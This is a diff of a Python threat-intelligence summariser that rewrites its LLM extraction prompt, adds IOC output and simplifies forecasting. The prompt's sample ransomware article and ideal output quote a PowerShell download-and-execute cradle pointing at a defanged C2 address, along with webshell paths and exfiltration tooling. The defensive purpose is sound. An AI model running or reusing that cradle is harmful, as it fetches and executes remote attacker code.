@@ -35,94 +35,299 @@ Titles:
 
 Respond with a JSON object: {{"relevant": [true, false, ...]}} — one boolean per title, same order."""
 
-SUMMARY_PROMPT = """You are a senior cybersecurity threat intelligence analyst.
-Given an article title and its full content, produce a structured analysis as a JSON object
-with these exact keys:
+SUMMARY_PROMPT = r"""You are a senior cybersecurity threat intelligence analyst.
+Given an article provided in the <article> element, produce a structured analysis as a JSON object
+with these exact keys.
+
+YOUR PRIMARY TASK IS EXTRACTION, NOT SUMMARIZATION. Do not condense the article into a brief
+overview — capture every discrete technical fact. Treating a detail as "minor" and omitting
+it is a failure mode. Be exhaustive. "Exhaustive" means no information is lost; it does NOT
+mean repeating the same subject across many near-identical bullets — group such findings
+(see CONSOLIDATION below).
+
+CRITICAL: Preserve all technical specifics exactly as written in the article. None must be
+omitted, generalized, or paraphrased.
+If the article content appears sparse, fragmented, or contains unusual character sequences,
+produce a best-effort analysis from whatever readable text is present — do not write
+data-quality observations, encoding complaints, or placeholder text into any JSON field.
 
 - "executive_summary": A concise paragraph (3-5 sentences) capturing the essence and
   significance of the threat, vulnerability, or finding. Be precise and informative.
 
-- "novelty": Describe what is novel or noteworthy about the reported threat actor tactics,
-  techniques, and tooling (TTPs). Be specific — mention exact techniques, tools, or
-  behavioral patterns that are new or unusual. If nothing is particularly novel, say so briefly.
+- "details": A JSON array of strings. Each string is one technical finding from the
+  article. Be EXHAUSTIVE but non-redundant — see CONSOLIDATION.
 
-- "details": A JSON array of strings. Each string is one detailed bullet point covering an
-  important technical finding from the article. Be thorough and accurate — do NOT skip any
-  significant detail. Include IOCs, affected systems/versions, attack chains, CVE IDs,
-  CVSS scores, technical specifics, timelines, and attribution where available.
+  For every article, actively scan for and extract each of the following when present:
+  * Malware and tool family names, version strings, and build identifiers
+  * CVE identifiers and CVSS scores
+  * File names, full file paths, and file hashes (MD5 / SHA1 / SHA256)
+  * Registry keys, mutex names, pipe names, and scheduled task names
+  * Shell commands, PowerShell scripts, or code snippets — quote them exactly
+  * Process names, service names, and DLL names involved in the attack
+  * Network infrastructure: IP addresses, domains, URLs, ports, and protocols
+  * C2 communication mechanisms: beacon interval, jitter, encryption, disguise profile
+  * Encoding, obfuscation, packing, or anti-analysis techniques used by the malware
+  * Persistence mechanisms: registry run keys, scheduled tasks, services, startup folders
+  * Privilege escalation techniques and UAC bypass methods
+  * Lateral movement tools and the methods used (pass-the-hash, Kerberoasting, etc.)
+  * Credential access techniques and the specific credential stores targeted
+  * Exfiltration tools, destination infrastructure, and data volume where stated
+  * Ransom demand amounts, cryptocurrency, and negotiation portal details
+  * Exact affected product names and their version strings
+  * Targeted industries, geographies, and victim profiles
+  * Timestamps, campaign dates, or observed activity timeframes
+  * Attribution evidence: infrastructure overlap, code reuse, TTP fingerprints, cluster names
+  * Quoted statistics, detection rates, infection counts, or impact metrics
+
+  EXTRACTION RULES — follow these strictly:
+  * Put genuinely distinct findings in separate bullets, but consolidate homogeneous
+    findings into one bullet (see CONSOLIDATION below)
+  * Never omit a finding because it seems minor; if the article states it, extract it
+  * Preserve exact names, values, IDs, hashes, version strings, and commands verbatim
+  * Coverage, not bullet count, is the goal: capture every specific from a detail-rich
+    article, but do NOT split one relationship into many bullets to inflate the count, and
+    do NOT merge unrelated facts to shrink it
+  * The number of bullets must scale with what the article actually states; a short or thin
+    article should yield only a few bullets. Do NOT fabricate, infer beyond the text, pad
+    with generic background, or restate the executive summary as details to bulk up the list
+
+  CONSOLIDATION — remove redundancy without losing any information:
+  * When multiple findings share the same subject and action and differ only along one
+    enumerable dimension (targets, sources, vectors, file types, etc.), express them as a
+    SINGLE bullet that lists every value. Never drop any value.
+  * Keep findings in separate bullets when they have different subjects or different
+    actions, or when each value is an independent technical artifact carrying its own
+    context (distinct hashes, CVEs, IPs, file paths, commands, version strings).
+  * EXCEPTION to "different actions" above — same subject, multiple qualitative attributes:
+    when several findings describe ONE shared subject and each merely states a static
+    qualitative property of it (privileges required, attack complexity, exploitability /
+    likelihood, severity, count of affected versions, etc.) rather than a distinct action it
+    performs, join them into a SINGLE bullet with "and". Never apply this when a property is an
+    independent technical artifact (hash, CVE, IP, file path, command, version string) — those
+    stay in their own bullets.
+
+    GOOD (consolidated, no information lost):
+    - "Campaign targets developers through compromised npm publishing workflows and malicious package updates"
+    - "Malware harvests API keys, cloud credentials, and SSH keys from developer systems"
+    - "All three vulnerabilities require no user privileges and have low attack complexity"
+
+    BAD (redundant — same subject/action repeated per item):
+    - "Campaign targets developers through compromised npm publishing workflows"
+    - "Campaign targets developers through malicious package updates"
+    - "Malware harvests API keys from developer systems"
+    - "Malware harvests cloud credentials from developer systems"
+    - "Malware harvests SSH keys from developer systems"
+
+    BAD (same subject split across separate attribute bullets — must be joined):
+    - "All three vulnerabilities require no user privileges"
+    - "All three vulnerabilities have low attack complexity"
+
+    BAD (narrative / vendor-PR filler — carries no intelligence, must be dropped):
+    - "By the following day after the vendor's claimed fix, new victims were still coming forward"
+    - "The company reached out to affected users warning them of 'suspicious activity'"
+    - "The company confirmed that steps have been taken to secure affected accounts"
+
+  EXCLUDE — never place the following in "details" (they carry no threat-intelligence value,
+  so dropping them is lossless):
+  * Vendor or company PR or reassurance statements — e.g. "the company confirmed steps have been
+    taken to secure accounts", "the vendor reached out to affected users", "the company takes
+    security seriously". These describe communications, not threat artifacts.
+  * Generic response or remediation announcements that name no specific technical action (no
+    patch version, config change, detection rule, or concrete step). A genuine specific fix
+    belongs in "mitigations" instead.
+  * Narrative or chronological color that restates the situation without adding a new technical
+    specific — e.g. "new victims were still coming forward the next day", "the issue remained
+    unresolved for hours".
+  * Journalistic framing, reactions, and opinion — these belong in "analyst_notes", not "details".
+
+- "analyst_notes": A paragraph capturing the article author's expert opinions, analytical
+  conclusions, and professional judgement — what they believe this means for the broader
+  threat landscape, their assessment of severity or attribution, and any forward-looking
+  observations. Focus on the analyst's voice and interpretation, not on facts already
+  captured in "details". Leave empty string if no clear analyst opinion is expressed.
 
 - "mitigations": A JSON array of strings. Each string is one actionable mitigation step or
-  defensive recommendation against the described attack or vulnerability. Include patching
-  guidance, detection rules, configuration hardening, and workarounds where mentioned.
+  defensive recommendation; either as suggested by the article or based on your internal
+  knowledge.
 
-- "tags": A JSON array of 3-8 lowercase hyphenated tags categorizing the article. Include:
-  * General category tags — use ONLY simple standard terms: "ransomware", "malware", "phishing",
-    "vulnerability", "data-leak", "supply-chain", "botnet", "c2", "iot", etc.
-    Do NOT invent compound descriptive tags (e.g., NEVER "offline-ransomware", "advanced-phishing",
-    "cyber-strategy", "government-hacking"). Keep category tags to 1-2 standard words.
-  * Specific threat actor or APT group names ONLY if explicitly named in the article.
-    Use their canonical MITRE ATT&CK name in lowercase hyphenated form:
-    "apt29", "apt42", "lazarus-group", "scattered-spider", "volt-typhoon",
-    "mustang-panda", "sandworm-team", "magic-hound", "kimsuky", "turla", etc.
-    See https://attack.mitre.org/groups/ for the authoritative list.
-  * Specific malware family or offensive tool names ONLY if explicitly named in the article.
-    Use their canonical MITRE ATT&CK name in lowercase hyphenated form:
-    "emotet", "cobalt-strike", "qakbot", "darkgate", "lumma-stealer",
-    "sliver", "brute-ratel-c4", "raspberry-robin", "socgholish", etc.
-    See https://attack.mitre.org/software/ for the authoritative list.
-    When the article mentions a specific version (e.g., "LockBit 3.0"), use it: "lockbit-3.0".
-    When the article mentions only the family name (e.g., "LockBit"), use the base name: "lockbit".
-  * CVE IDs if mentioned (e.g., "cve-2024-1234")
-  * NEVER include "network-traffic" in this tags list. It is handled separately
-    below via the "network_traffic_tag" field.
-  Prefer real named entities over generic labels. Every tag must be EITHER a standard
-  category keyword OR a real MITRE ATT&CK entity name — never an invented description.
+- "iocs": A JSON array of strings. Each string is one Indicator of Compromise explicitly
+  mentioned in the article: IP addresses, domains, URLs, file hashes (MD5/SHA1/SHA256),
+  file names, registry keys, mutexes, email addresses, or any other concrete artifact.
+  Return an empty array [] if no IOCs are mentioned.
 
-- "network_traffic_tag": true or false. Two independent paths to TRUE:
-  PATH A — Network IOC: The article prints a specific IP address, domain name,
-    URL, HTTP header/URI pattern, User-Agent string, or JA3/JARM hash that an
-    analyst could paste directly into a Snort rule or blocklist. The literal
-    value (e.g. "203.0.113.5", "evil.example.com", "/api/exploit?cmd=") must
-    appear verbatim in the article text.
-    NOT enough: aggregate counts ("seized 34 domains"), general descriptions
-    ("attacked U.S. networks"), law-enforcement takedown summaries ("shut down
-    malicious IPs"), or naming products/services without a concrete IOC.
-  PATH B — PoC available: The article states that proof-of-concept exploit code
-    has been published, is publicly available, or was released by a researcher.
-    Look for phrases like "proof-of-concept", "PoC", "exploit code published",
-    "exploit code available", "PoC exploit".
-  If neither path applies, set false.
+- "tags": A JSON array of 3-8 lowercase hyphenated tags. Always include at least one broad
+  threat-category tag from this list: vulnerability, exploit, cve, malware, ransomware, trojan,
+  infostealer, stealer, apt, threat-actor, phishing, credential-theft, data-breach, supply-chain,
+  botnet, ddos, c2, iot, firmware. Then add specific tags such as malware family names, CVE IDs,
+  targeted products, or affected vendors.
 
-- "network_traffic_reason": When "network_traffic_tag" is true, paste the exact
-  quote from the article (the IOC value for Path A, or the PoC availability
-  statement for Path B). If you cannot produce a verbatim quote, you must set
-  "network_traffic_tag" to false instead. Set to null when false.
+- "attack_flow": A JSON array representing the attack chain as ordered steps.
+  Each step is an object with keys: "phase", "title", "description", "technique".
+  - "phase" MUST be one of these official MITRE ATT&CK tactics (use exact spelling):
+    "Reconnaissance", "Resource Development", "Initial Access", "Execution",
+    "Persistence", "Privilege Escalation", "Defense Evasion", "Credential Access",
+    "Discovery", "Lateral Movement", "Collection", "Command and Control",
+    "Exfiltration", "Impact"
+  - "title" should be the name of the specific MITRE ATT&CK technique used
+    (e.g., "Spearphishing Attachment", "PowerShell", "OS Credential Dumping")
+  - "technique" should be the MITRE ATT&CK technique ID if identifiable
+    (e.g., "T1566.001", "T1059.001", "T1003"). Leave empty string if unknown.
+  - "description" should explain how this step was used in the attack described
+  If no attack sequence is described, return an empty array [].
 
-- "attack_flow": A JSON array representing the attack chain / kill chain as ordered steps.
-  Each step is an object with these keys:
-    * "phase": The MITRE ATT&CK tactic name (e.g., "Initial Access", "Execution",
-      "Persistence", "Privilege Escalation", "Defense Evasion", "Credential Access",
-      "Discovery", "Lateral Movement", "Collection", "Exfiltration", "Impact",
-      "Reconnaissance", "Resource Development"). Use the closest matching tactic.
-    * "title": A short, specific title for this step of the attack (e.g.,
-      "Spear-Phishing with Weaponized Document").
-    * "description": 2-3 sentences describing what happened in this step, specific to
-      the article's content. Be concrete — mention the actual tools, files, CVEs, or
-      techniques used.
-    * "technique": The MITRE ATT&CK technique ID if applicable (e.g., "T1566.001",
-      "T1059.001"). Use "" if no specific technique maps clearly.
-  If the article describes a clear attack sequence or campaign, capture each phase in order.
-  If the article does NOT describe an attack sequence (e.g., it is a vulnerability disclosure,
-  policy piece, or tool release), return an empty array [].
+Before generating your final answer, re-scan the article top to bottom and verify that every
+technical detail has been captured in "details" or "iocs". Add any you missed.
 
-CRITICAL: Be exhaustive and thorough in your analysis. NEVER skip or omit information
-that could be relevant to a threat analyst. When in doubt, ALWAYS include information
-rather than leave it out. Every IOC, every CVE, every technique, every tool name,
-every affected system, every timeline detail matters. Incomplete analysis is worse
-than verbose analysis. Cover EVERYTHING the article reports.
+--- EXAMPLE OF IDEAL EXTRACTION ---
+The following shows the expected extraction quality for a detail-rich technical article.
+Notice that every technical specific is captured and nothing is omitted, while homogeneous
+findings are consolidated into single bullets. A shorter article would yield correspondingly
+fewer bullets.
 
-Be accurate and precise. When in doubt, include content rather than skip it.
-Respond ONLY with valid JSON."""
+<article>
+<title>BlackCat Ransomware Exploits CVE-2023-3519 in Citrix NetScaler to Breach Healthcare Network</title>
+<content>
+Researchers observed a BlackCat (ALPHV) ransomware campaign targeting US healthcare
+organizations. The initial intrusion vector was CVE-2023-3519, a critical unauthenticated
+remote code execution vulnerability (CVSS 9.8) in Citrix NetScaler ADC and Gateway, allowing
+attackers to plant a webshell via a specially crafted HTTP request to unpatched appliances
+running firmware versions prior to 13.1-49.13.
+
+Within 30 minutes of initial access, the threat actor deployed a PHP webshell at
+/var/netscaler/ns/var/vpn/bookmark/shell.php (MD5: a1b2c3d4e5f678900000000000000001). The
+webshell was used to download a Cobalt Strike Beacon stager via PowerShell:
+IEX (New-Object Net.WebClient).DownloadString('hxxp://185.220.101[.]47/stage.ps1').
+
+The Beacon payload (SHA256: 9a8b7c6d5e4f3a2b0000000000000000000000000000000000000000000000001a)
+communicated with C2 at 185.220.101[.]47 over HTTPS port 443 using a 60-second beacon interval
+with jitter. The malleable C2 profile masqueraded as Google Analytics traffic.
+
+Lateral movement used PsExec renamed as svchost32.exe and WMI remote execution. Credentials were
+harvested from LSASS memory using a modified Mimikatz variant
+(SHA256: f1e2d3c4b5a697880000000000000000000000000000000000000000000000002b). BloodHound
+(SharpHound) was deployed at C:\Windows\Temp\sharphound.exe for AD enumeration.
+
+Prior to encryption, 2.3 TB of patient data was exfiltrated via Rclone v1.63.0, configured at
+C:\ProgramData\rclone\rclone.conf targeting a Mega.nz endpoint. The BlackCat payload
+(SHA256: 0a1b2c3d4e5f6a7b0000000000000000000000000000000000000000000000003c) ran via a scheduled
+task named 'MicrosoftEdgeUpdateTaskMachineCore2', encrypting files with ChaCha20-Poly1305 and
+appending the .alphv extension. The ransom note RECOVER-FILES.txt demanded $4.2M in Monero via
+hxxp://alphvmmm27o3abo3r2m[.]onion.
+
+The intrusion was attributed to affiliate cluster UNC4466 based on infrastructure overlap and
+identical Cobalt Strike C2 profiles seen in three prior campaigns. Researchers note a shift from
+financial services to healthcare targeting, driven by the sector's lower patch cadence.
+</content>
+</article>
+
+IDEAL OUTPUT:
+{
+  "executive_summary": "A BlackCat (ALPHV) ransomware affiliate (UNC4466) compromised a US healthcare organization by exploiting CVE-2023-3519, a critical unauthenticated RCE in Citrix NetScaler ADC/Gateway (CVSS 9.8). The attacker deployed Cobalt Strike for C2, harvested domain credentials via modified Mimikatz, exfiltrated 2.3 TB of patient data via Rclone, then deployed BlackCat ransomware via scheduled task demanding $4.2M in Monero. Researchers attribute this to a deliberate sector pivot by UNC4466 exploiting healthcare's lower patch cadence.",
+  "details": [
+    "CVE-2023-3519 is an unauthenticated RCE in Citrix NetScaler ADC and Gateway with CVSS score 9.8",
+    "Exploitation requires a specially crafted HTTP request; affects firmware versions prior to 13.1-49.13",
+    "PHP webshell deployed at /var/netscaler/ns/var/vpn/bookmark/shell.php within 30 minutes of initial access",
+    "Webshell MD5 hash: a1b2c3d4e5f678900000000000000001",
+    "Cobalt Strike Beacon stager downloaded via PowerShell cradle: IEX (New-Object Net.WebClient).DownloadString('hxxp://185.220.101[.]47/stage.ps1')",
+    "Cobalt Strike Beacon SHA256: 9a8b7c6d5e4f3a2b0000000000000000000000000000000000000000000000001a",
+    "C2 server: 185.220.101[.]47 over HTTPS port 443",
+    "Beacon interval: 60 seconds with jitter",
+    "Cobalt Strike malleable C2 profile masqueraded as Google Analytics traffic",
+    "Lateral movement performed via PsExec (renamed as svchost32.exe) and WMI remote execution",
+    "Modified Mimikatz variant used to harvest credentials from LSASS memory; SHA256: f1e2d3c4b5a697880000000000000000000000000000000000000000000000002b",
+    "Credential harvest targeted domain administrator accounts",
+    "BloodHound (SharpHound) deployed at C:\\Windows\\Temp\\sharphound.exe for Active Directory enumeration",
+    "2.3 TB of patient data exfiltrated prior to encryption",
+    "Exfiltration tool: Rclone v1.63.0",
+    "Rclone configured at C:\\ProgramData\\rclone\\rclone.conf targeting attacker-controlled Mega.nz storage",
+    "BlackCat ransomware payload SHA256: 0a1b2c3d4e5f6a7b0000000000000000000000000000000000000000000000003c",
+    "Ransomware executed via scheduled task named 'MicrosoftEdgeUpdateTaskMachineCore2'",
+    "BlackCat used ChaCha20-Poly1305 encryption with a per-file unique key",
+    "Encrypted files received .alphv extension",
+    "Ransom note filename: RECOVER-FILES.txt",
+    "Ransom demand: $4.2M USD in Monero",
+    "Negotiation portal: hxxp://alphvmmm27o3abo3r2m[.]onion",
+    "Attribution to UNC4466 based on infrastructure overlap and identical Cobalt Strike C2 profiles across three prior campaigns",
+    "Campaign represents a shift in targeting from financial services to healthcare"
+  ],
+  "analyst_notes": "Researchers assess UNC4466 deliberately pivoted to healthcare due to the sector's lower patch cadence and higher propensity to pay ransoms. The reuse of identical Cobalt Strike malleable C2 profiles across three campaigns suggests operational infrastructure reuse, creating a detection opportunity for defenders tracking this cluster.",
+  "mitigations": [
+    "Patch Citrix NetScaler ADC and Gateway to firmware 13.1-49.13 or later immediately to address CVE-2023-3519",
+    "Audit Citrix appliances for webshells in /var/netscaler/ directories",
+    "Block outbound connections to 185.220.101[.]47 and hunt for Cobalt Strike beacon patterns in network traffic",
+    "Enable Credential Guard and restrict LSASS access to prevent Mimikatz-style credential dumping",
+    "Block or alert on PsExec execution, especially with non-standard binary names",
+    "Monitor for Rclone execution and large outbound transfers to cloud storage providers",
+    "Audit scheduled tasks for entries masquerading as Microsoft update tasks",
+    "Require MFA on domain administrator accounts to limit blast radius of credential theft"
+  ],
+  "iocs": [
+    "185.220.101[.]47",
+    "/var/netscaler/ns/var/vpn/bookmark/shell.php",
+    "a1b2c3d4e5f678900000000000000001",
+    "9a8b7c6d5e4f3a2b0000000000000000000000000000000000000000000000001a",
+    "f1e2d3c4b5a697880000000000000000000000000000000000000000000000002b",
+    "0a1b2c3d4e5f6a7b0000000000000000000000000000000000000000000000003c",
+    "C:\\Windows\\Temp\\sharphound.exe",
+    "C:\\ProgramData\\rclone\\rclone.conf",
+    "alphvmmm27o3abo3r2m[.]onion",
+    "RECOVER-FILES.txt"
+  ],
+  "tags": ["ransomware", "blackcat", "alphv", "cve-2023-3519", "citrix-netscaler", "healthcare"],
+  "attack_flow": [
+    {
+      "phase": "Initial Access",
+      "title": "Exploit Public-Facing Application",
+      "technique": "T1190",
+      "description": "Exploited CVE-2023-3519 (CVSS 9.8) in unpatched Citrix NetScaler ADC/Gateway via unauthenticated RCE to deploy a PHP webshell at /var/netscaler/ns/var/vpn/bookmark/shell.php"
+    },
+    {
+      "phase": "Execution",
+      "title": "Command and Scripting Interpreter: PowerShell",
+      "technique": "T1059.001",
+      "description": "Used a PowerShell IEX download cradle via the webshell to fetch and execute a Cobalt Strike Beacon stager from 185.220.101[.]47"
+    },
+    {
+      "phase": "Command and Control",
+      "title": "Application Layer Protocol: Web Protocols",
+      "technique": "T1071.001",
+      "description": "Cobalt Strike Beacon beaconed over HTTPS to 185.220.101[.]47:443 every 60 seconds with jitter, using a malleable C2 profile impersonating Google Analytics"
+    },
+    {
+      "phase": "Credential Access",
+      "title": "OS Credential Dumping: LSASS Memory",
+      "technique": "T1003.001",
+      "description": "Modified Mimikatz variant dumped domain administrator credentials from LSASS memory"
+    },
+    {
+      "phase": "Discovery",
+      "title": "Domain Trust Discovery",
+      "technique": "T1482",
+      "description": "BloodHound (SharpHound) deployed at C:\\Windows\\Temp\\sharphound.exe to enumerate Active Directory for privilege escalation and lateral movement paths"
+    },
+    {
+      "phase": "Lateral Movement",
+      "title": "Remote Services: SMB/Windows Admin Shares",
+      "technique": "T1021.002",
+      "description": "PsExec (renamed svchost32.exe) and WMI remote execution used with harvested domain admin credentials to move across domain-joined machines"
+    },
+    {
+      "phase": "Exfiltration",
+      "title": "Exfiltration to Cloud Storage",
+      "technique": "T1567.002",
+      "description": "Rclone v1.63.0, configured via C:\\ProgramData\\rclone\\rclone.conf, exfiltrated 2.3 TB of patient data to attacker-controlled Mega.nz storage"
+    },
+    {
+      "phase": "Impact",
+      "title": "Data Encrypted for Impact",
+      "technique": "T1486",
+      "description": "BlackCat ransomware executed via scheduled task 'MicrosoftEdgeUpdateTaskMachineCore2', encrypting files with ChaCha20-Poly1305 and appending .alphv extension; RECOVER-FILES.txt demanded $4.2M in Monero"
+    }
+  ]
+}
+--- END EXAMPLE ---
+
+The article to analyze is provided in the <article> element. Respond ONLY with valid JSON."""
 
 
 def _is_rate_limit_error(exc):
@@ -176,7 +381,7 @@ def check_relevance(titles):
                 batch_results.append(True)
             results.extend(batch_results[: len(batch)])
         except Exception as e:
-            logger.error(f"Relevance check failed for batch: {e}")
+            logger.error(f"Relevance check failed for batch: {e}", exc_info=True)
             results.extend([True] * len(batch))  # Accept all on error
 
     return results
@@ -185,12 +390,14 @@ def check_relevance(titles):
 def _compose_markdown(data):
     """Build a markdown summary from structured LLM JSON output.
 
-    Assembles sections for executive summary, novelty notes, details,
-    and mitigations into a single markdown string.
+    Assembles sections for executive summary, details, analyst notes,
+    mitigations, and IOCs into a single markdown string (mirrors the
+    Android ``MarkdownComposer``).
 
     Args:
-        data: Dictionary with keys ``executive_summary``, ``novelty``,
-            ``details`` (list), and ``mitigations`` (list).
+        data: Dictionary with keys ``executive_summary``, ``details``
+            (list), ``analyst_notes`` (string), ``mitigations`` (list),
+            and ``iocs`` (list).
 
     Returns:
         Formatted markdown string with headed sections.
@@ -198,27 +405,35 @@ def _compose_markdown(data):
     sections = []
 
     sections.append("# Executive Summary")
-    sections.append(data.get("executive_summary", "No summary available."))
-    sections.append("")
-
-    sections.append("# Novelty about reported threat actor tactics, techniques, and tooling")
-    sections.append(data.get("novelty", "Nothing particularly novel reported."))
+    sections.append(data.get("executive_summary") or "No summary available.")
     sections.append("")
 
     sections.append("# Details")
-    for point in data.get("details", []):
-        point = str(point).strip()
-        if not point or point.startswith("#"):
-            continue
-        sections.append(f"- {point}")
+    details = [str(p).strip() for p in data.get("details", []) if str(p).strip() and not str(p).strip().startswith("#")]
+    if details:
+        sections.extend(f"- {p}" for p in details)
+    else:
+        sections.append("No details available.")
     sections.append("")
 
+    analyst_notes = (data.get("analyst_notes") or "").strip()
+    if analyst_notes:
+        sections.append("# Analyst Notes")
+        sections.append(analyst_notes)
+        sections.append("")
+
     sections.append("# Mitigations")
-    for point in data.get("mitigations", []):
-        point = str(point).strip()
-        if not point or point.startswith("#"):
-            continue
-        sections.append(f"- {point}")
+    mitigations = [str(p).strip() for p in data.get("mitigations", []) if str(p).strip() and not str(p).strip().startswith("#")]
+    if mitigations:
+        sections.extend(f"- {p}" for p in mitigations)
+    else:
+        sections.append("No mitigations listed.")
+
+    iocs = [str(p).strip() for p in data.get("iocs", []) if str(p).strip()]
+    if iocs:
+        sections.append("")
+        sections.append("# IOCs")
+        sections.extend(f"- {p}" for p in iocs)
 
     return "\n".join(sections)
 
@@ -237,19 +452,26 @@ def summarize_article(title, content):
     Returns:
         A dict with keys ``summary`` (markdown string), ``tags``
         (list of strings), ``attack_flow`` (list of phase dicts), and
-        ``novelty`` (string). Returns None if the API key is missing
-        or all retries fail.
+        ``raw_data`` (the parsed LLM JSON). Returns None if the API key
+        is missing or all retries fail.
     """
     if not has_api_key():
         logger.warning("LLM API key not configured, skipping summarization")
         return None
 
     # Truncate content to stay within token limits
-    max_chars = 12000
+    max_chars = 20000
     if len(content) > max_chars:
         content = content[:max_chars] + "\n\n[Content truncated...]"
 
-    user_message = f"Title: {title}\n\nArticle Content:\n{content}"
+    # Strip control characters (null bytes, form feeds, etc.) that cause some models
+    # to treat the content as binary-corrupted. Preserves \t, \n, \r.
+    content = "".join(
+        ch for ch in content
+        if not (ord(ch) <= 8 or 11 <= ord(ch) <= 12 or 14 <= ord(ch) <= 31 or ord(ch) == 127)
+    )
+
+    user_message = f"<article>\n<title>{title}</title>\n<content>\n{content}\n</content>\n</article>"
 
     for attempt in range(3):
         try:
@@ -257,16 +479,12 @@ def summarize_article(title, content):
                 SUMMARY_PROMPT,
                 [{"role": "user", "content": user_message}],
                 temperature=0.3,
-                max_tokens=2500,
+                max_tokens=12000,
                 json_mode=True,
             )
             cost_tracker.add_tokens(it, ot, cc, cr)
             result = json.loads(content_str)
             tags = result.get("tags", [])
-            # The LLM decides network-traffic via a separate boolean field
-            # to avoid false positives from vague network-adjacent mentions.
-            if result.get("network_traffic_tag") is True and "network-traffic" not in tags:
-                tags.append("network-traffic")
             result["tags"] = tags
             summary_md = _compose_markdown(result)
 
@@ -274,8 +492,6 @@ def summarize_article(title, content):
                 "summary": summary_md,
                 "tags": tags,
                 "attack_flow": result.get("attack_flow", []),
-                "novelty": result.get("novelty", ""),
-                "network_traffic_reason": result.get("network_traffic_reason") or None,
                 "raw_data": result,
             }
 
@@ -285,10 +501,10 @@ def summarize_article(title, content):
                 logger.warning(f"Rate limited, waiting {wait}s before retry")
                 time.sleep(wait)
             elif attempt < 2:
-                logger.error(f"Summarization error (attempt {attempt + 1}): {e}")
+                logger.error(f"Summarization error (attempt {attempt + 1}): {e}", exc_info=True)
                 time.sleep(1)
             else:
-                logger.error(f"All summarization retries failed: {e}")
+                logger.error(f"All summarization retries failed: {e}", exc_info=True)
                 return None
 
     return None
@@ -305,7 +521,7 @@ Produce a JSON object with exactly two keys:
    evolving right now. Cover:
    * Evolving TTPs (tactics, techniques, and procedures)
    * New tools, malware families, or infrastructure being adopted
-   * Shifts in targeting (industries, geographies, platforms)
+   * Shifts in targeting (industries, geographies, victim profiles)
    * Notable behavioral changes compared to earlier activity
 
 2. "forecast" — A forward-looking assessment (2-4 paragraphs of markdown) predicting where
@@ -315,29 +531,15 @@ Produce a JSON object with exactly two keys:
    * Recommended priority areas for security teams
 
 Use markdown formatting (headings, bold, bullet lists) to make the text scannable.
-Be specific and cite patterns you observe in the provided articles.
-Respond ONLY with valid JSON."""
-
-TREND_FORECAST_REFINE_PROMPT = """You are a senior cybersecurity threat-intelligence strategist.
-
-You previously analyzed a subset of "{category}" articles and produced the analysis below.
-You are now given additional articles not yet reflected in that analysis.
-
-Update and refine both outputs to incorporate the new information. Keep the same structure
-and depth — update only what the new articles change or add.
-
-CURRENT TREND ANALYSIS:
-{current_trend}
-
-CURRENT FORECAST:
-{current_forecast}
-
-Produce a JSON object with exactly two keys: "trend" and "forecast".
+Be specific and cite patterns from the provided articles.
 Respond ONLY with valid JSON."""
 
 
 def estimate_insight_cost(article_count, model):
-    """Estimate the LLM cost for an iterative category insight (forecast) run.
+    """Estimate the LLM cost for a single-pass category insight (forecast) run.
+
+    Mirrors the Android ``estimateInsightCost``: the article lines are sent in a
+    single request (input capped at ~5,000 tokens) with a fixed output budget.
 
     Args:
         article_count: Number of articles that will be included.
@@ -346,20 +548,10 @@ def estimate_insight_cost(article_count, model):
     Returns:
         Estimated cost in USD as a float.
     """
-    import math
     from cost_tracker import _lookup_pricing
     inp_price, _cached_price, out_price = _lookup_pricing(model)
-    # ~300 chars per article line (title + date + 500-char exec summary extract)
-    total_chars = article_count * 300
-    n_chunks = max(1, math.ceil(total_chars / _INSIGHT_CHUNK_CHARS))
-    tokens_per_chunk = _INSIGHT_CHUNK_CHARS // 4  # ~4 chars per token
-    prompt_overhead = 200
-    prev_analysis_tokens = 500  # trend + forecast carried forward as context
-    first_input = tokens_per_chunk + prompt_overhead
-    refine_input = (tokens_per_chunk + prev_analysis_tokens + prompt_overhead) * (n_chunks - 1)
-    total_input = first_input + refine_input
-    total_output = 2000 * n_chunks
-    return (total_input * inp_price + total_output * out_price) / 1_000_000
+    est_input = min(article_count * 200, 5000) + 200
+    return (est_input * inp_price + 2000 * out_price) / 1_000_000
 
 
 def estimate_trend_cost(articles, model):
@@ -385,91 +577,13 @@ def estimate_trend_cost(articles, model):
     return cost, n_quarters, n_years
 
 
-def _iterative_insight_analysis(lines, context_label, article_count):
-    """Analyze article lines iteratively in ~10k-char chunks, carrying analysis forward.
-
-    Splits the article lines into chunks of at most ``_INSIGHT_CHUNK_CHARS``
-    characters. The first chunk is analyzed with ``TREND_FORECAST_PROMPT``; each
-    subsequent chunk is processed with ``TREND_FORECAST_REFINE_PROMPT``, which
-    receives the previous analysis as context so no data is discarded.
-
-    Args:
-        lines: List of formatted article strings (title + date + exec summary).
-        context_label: Category/subcategory display name for prompts.
-        article_count: Total article count for the user message header.
-
-    Returns:
-        dict with ``trend`` and ``forecast`` keys, or ``None`` on failure.
-    """
-    # Split lines into chunks of at most _INSIGHT_CHUNK_CHARS chars
-    chunks, current, current_len = [], [], 0
-    for line in lines:
-        line_len = len(line) + 1  # +1 for the joining newline
-        if current and current_len + line_len > _INSIGHT_CHUNK_CHARS:
-            chunks.append("\n".join(current))
-            current, current_len = [line], line_len
-        else:
-            current.append(line)
-            current_len += line_len
-    if current:
-        chunks.append("\n".join(current))
-
-    if not chunks:
-        return None
-
-    analysis = None
-
-    for i, chunk in enumerate(chunks):
-        if i == 0:
-            system_prompt = TREND_FORECAST_PROMPT.format(category=context_label)
-            user_message = (
-                f"Category: {context_label}\nArticle count: {article_count}\n\n{chunk}"
-            )
-        else:
-            system_prompt = TREND_FORECAST_REFINE_PROMPT.format(
-                category=context_label,
-                current_trend=analysis["trend"],
-                current_forecast=analysis["forecast"],
-            )
-            user_message = f"Additional articles (batch {i + 1} of {len(chunks)}):\n\n{chunk}"
-
-        for attempt in range(3):
-            try:
-                content, it, ot, cc, cr = call_llm(
-                    system_prompt,
-                    [{"role": "user", "content": user_message}],
-                    temperature=0.4,
-                    max_tokens=2000,
-                    json_mode=True,
-                )
-                cost_tracker.add_tokens(it, ot, cc, cr)
-                parsed = json.loads(content)
-                analysis = {
-                    "trend": parsed.get("trend", ""),
-                    "forecast": parsed.get("forecast", ""),
-                }
-                break
-            except Exception as e:
-                if _is_rate_limit_error(e):
-                    wait = 2 ** (attempt + 1)
-                    logger.warning(f"Rate limited, waiting {wait}s before retry")
-                    time.sleep(wait)
-                elif attempt < 2:
-                    logger.error(f"Insight generation error chunk {i + 1}, attempt {attempt + 1}: {e}")
-                    time.sleep(1)
-                else:
-                    logger.error(f"All retries failed on chunk {i + 1}: {e}")
-                    return None
-
